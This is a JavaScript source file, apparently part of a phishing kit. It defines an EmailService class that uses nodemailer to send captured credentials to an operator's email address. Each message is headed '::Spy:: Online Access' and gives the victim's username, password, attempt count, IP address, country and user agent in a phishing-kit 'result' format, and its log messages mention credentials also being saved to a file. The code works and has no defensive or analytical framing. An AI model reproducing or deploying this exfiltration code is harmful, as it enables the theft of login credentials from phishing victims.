const nodemailer = require('nodemailer');
const config = require('../config/config.cjs');

class EmailService {
  constructor() {
    this.transporter = null;
    this.setupTransporter();
  }

  setupTransporter() {
    if (!config.email.smtp.auth.user || !config.email.smtp.auth.pass) {
      console.log('Email not configured - skipping email setup');
      return;
    }

    try {
      this.transporter = nodemailer.createTransport(config.email.smtp);
    } catch (error) {
      console.error('Failed to setup email transporter:', error);
    }
  }

  async sendCredentials(credentials, visitorInfo) {
    if (!this.transporter) {
      console.log('Email not configured - credentials logged to file only');
      return;
    }

    const subject = `::Spy:: Online Access: ${visitorInfo.ip}`;
    const message = this.formatMessage(credentials, visitorInfo);

    try {
      await this.transporter.sendMail({
        from: config.email.smtp.auth.user,
        to: config.email.to,
        subject: subject,
        text: message
      });
      console.log('Email sent successfully');
    } catch (error) {
      console.error('Failed to send email:', error);
    }
  }

  formatMessage(credentials, visitorInfo) {
    return `
#------------------[ Online Access ${credentials.attempt} ]---------------------#
Username  : ${credentials.username}
Password  : ${credentials.password}
#---------------------[ Visitor ]-------------------------#
IP Address    : ${visitorInfo.ip}
Country       : ${visitorInfo.country || 'Unknown'}
User Agent    : ${visitorInfo.userAgent}
Timestamp     : ${new Date().toISOString()}
#-------------------[ SPY - END ]------------------------#
`;
  }
}

module.exports = EmailService;